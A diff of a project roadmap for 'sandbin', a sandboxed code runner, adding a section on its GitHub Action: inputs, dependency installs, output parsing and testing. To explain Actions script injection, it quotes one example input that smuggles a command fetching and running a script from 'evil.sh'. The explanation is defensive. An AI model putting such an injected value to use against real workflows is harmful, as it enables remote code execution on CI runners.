@@ -532,21 +532,60 @@ kernel itself mishandles. Seccomp is the layer that shrinks that surface.
   correctness, and belongs alongside the existing benchmarks rather than
   gating CI on wall-clock numbers that will legitimately vary by machine
 
+## Phase 15 — GitHub Action (done)
+
+- `action.yml` at the repo root, a composite action so any workflow can
+  do `uses: ayazdoruck/sandbin@main` and get a real sandboxed run as a
+  step — inputs mirror the CLI's own flags (`code`/`code-file`,
+  `language`, `stdin`, the four limit overrides, `fail-on-error`),
+  outputs are `verdict`/`exit-code`/`stdout`/`stderr`
+- installs exactly what this project's own CI already installs
+  (`bubblewrap`, `libseccomp`, `gcc`, `golang-go` only when
+  `language: go`, the AppArmor unprivileged-userns sysctl) rather than
+  inventing a second set of host requirements — same Ubuntu-family-runner
+  assumption as everywhere else in this repo
+- the one thing that got real security attention rather than being
+  written on autopilot: every user-supplied input that flows into a
+  `run:` step is passed through `env:`, never interpolated directly into
+  the script text. Directly interpolating `${{ inputs.code }}` into a
+  `run:` block is a well-known Actions injection class — the input value
+  becomes part of the script GitHub actually executes, so `code`
+  containing something like `"; curl evil.sh | sh #` would run on the
+  runner before sandbin ever got a chance to sandbox anything. Getting
+  this wrong specifically here — in the action whose entire purpose is
+  running untrusted input safely — would have undermined the whole point
+- output parsing avoids shell string-munging entirely: the CLI's own
+  `--json` result is read and turned into `$GITHUB_OUTPUT` entries by a
+  small inline Node script (`node --input-type=module -e '...'`), using
+  a randomly generated heredoc delimiter for the multi-line
+  `stdout`/`stderr` outputs per GitHub's own documented format, rather
+  than a fragile `grep`/`jq` pipeline
+- verified two ways: every step's shell/Node logic was extracted and run
+  by hand locally first (`GITHUB_OUTPUT` pointed at a real temp file,
+  `github.action_path` at the repo root) against a success case, a
+  `fail-on-error: true` failure case, and a `fail-on-error: false` one —
+  confirming the exact `$GITHUB_OUTPUT` contents and exit codes before
+  any of it went near a real workflow. `.github/workflows/action-test.yml`
+  is the real test: it uses `./` (this repo, checked out by the workflow
+  itself) as the action and asserts on the same three cases end to end,
+  running on every push same as `ci.yml`
+- what local hand-testing can't cover: whether `uses: ./` and
+  `github.action_path` resolve the way the composite-action docs say
+  they will inside an actual Actions runner. That only gets proven by
+  the real workflow run this repo's own CI now performs on every push —
+  the same trust boundary this project already accepts for `ci.yml`
+  itself, which was never re-run locally either
+
 ## What's left
 
 Closing real gaps rather than adding breadth for its own sake, roughly in
 the order they're worth doing:
 
-- **Docs site sync — mostly done, one gap left.** `index.html`,
-  `api.html` and `testing.html` had drifted from what `deploy_to_vercel`
-  actually shipped in earlier phases; the repo now matches production
-  again (95/95, a Metrics section, the eight-suite table). What's still
-  missing: the CLI itself has no page on the deployed site, only in
-  `README.md` — everything else got folded into an existing page, the
-  CLI is arguably substantial enough to warrant its own.
-- **GitHub Action.** A reusable Action wrapping `sandbin run` (or the
-  HTTP API directly) so a CI workflow anywhere can execute untrusted
-  code through this sandbox as a step, without vendoring the CLI.
+- **A dedicated CLI docs page.** `sandbin.vercel.app` documents
+  `/metrics` (folded into the API page) but the CLI itself is still only
+  in `README.md`, not on the deployed site — everything else got folded
+  into an existing page; the CLI is arguably substantial enough to
+  warrant its own.
 - **Embeddable widget.** A small script + iframe another site could drop
   in to embed a working sandbin playground, reusing the existing
   streaming API rather than building a second one.
